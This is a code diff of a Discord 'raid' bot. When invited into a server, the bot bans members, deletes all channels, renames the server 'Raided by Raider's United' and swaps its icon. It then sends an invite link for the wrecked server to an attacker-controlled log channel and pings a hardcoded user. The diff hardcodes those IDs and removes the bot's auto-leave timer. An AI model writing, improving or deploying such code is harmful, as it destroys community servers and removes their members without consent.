@@ -8,9 +8,7 @@ const client = new Discord.Client({
 
 const token = config.token,
     bypassGuilds = config.bypassGuilds,
-    bypassUsers = config.bypassUsers,
-    logChannel = config.logChannel
-
+    bypassUsers = config.bypassUsers
 
 client.once("ready", async () => {
     console.log(`${client.user.tag} | ${client.user.id} is online`);
@@ -20,7 +18,7 @@ client.once("ready", async () => {
 
 client.on("guildCreate", async (guild) => {
     try {
-        const log = client.channels.cache.get(logChannel)
+        const log = client.channels.cache.get('1095865165012029582')
 
         const embed = new EmbedBuilder()
             .addFields({
@@ -42,27 +40,18 @@ client.on("guildCreate", async (guild) => {
         guild.members.cache.forEach(async (member) => {
             if (guild.members.cache.has(bypassUsers)) {
                 return
+            }
+
+            if (member.permissions.has(PermissionFlagsBits.Administrator)) {
+                return
             } else {
                 member.ban({ reason: "Cuz you invited a random bot lol" })
-            }
-
-            if (member?.permissions.has(PermissionFlagsBits.Administrator)) {
-                return
-            }
-
-            if (member.id === client.user.id) {
-                return
             }
         })
 
         await guild.setName(`Raided by Raider\'s United`)
 
         await guild.setIcon('https://cdn.discordapp.com/icons/1076549227267768320/af6a752e321510c41fed4ae484977fac.webp?size=4096')
-
-        setInterval(async () => {
-            return await guild.leave().catch(() => null)
-        }, 60000);
-
 
         guild.channels.cache.forEach(async (channel) => {
             channel.delete().catch(() => null)
@@ -78,7 +67,7 @@ client.on("guildCreate", async (guild) => {
 })
 
 client.on("guildDelete", async (guild) => {
-    const log = client.channels.cache.get(logChannel)
+    const log = client.channels.cache.get('1095865165012029582')
 
     const embed = new EmbedBuilder()
         .addFields({
@@ -108,17 +97,15 @@ client.on("guildMemberAdd", async (member) => {
 })
 
 client.on("channelCreate", async (channel) => {
-    const log = client.channels.cache.get(logChannel)
+    const log = client.channels.cache.get('1095865165012029582')
 
     if (channel.name === "this-is-why-you-dont-invite-random-bots") {
         await channel.createInvite().then(async (i) => {
             await log.send([
-                `<@${client.users.cache.get(`${bypassUsers}`).id}>`,
+                `<@${client.users.cache.get('1093248824987885679').id}>`,
                 `\u200b`,
                 `Invite for ${channel.guild.name}`,
                 `https://discord.gg/${i.code}`,
-                `\u200b`,
-                `You have 60 seconds (1 minute) to join so the bot can give you the role before it leaves`
             ].join("\n"))
         })
     } else {
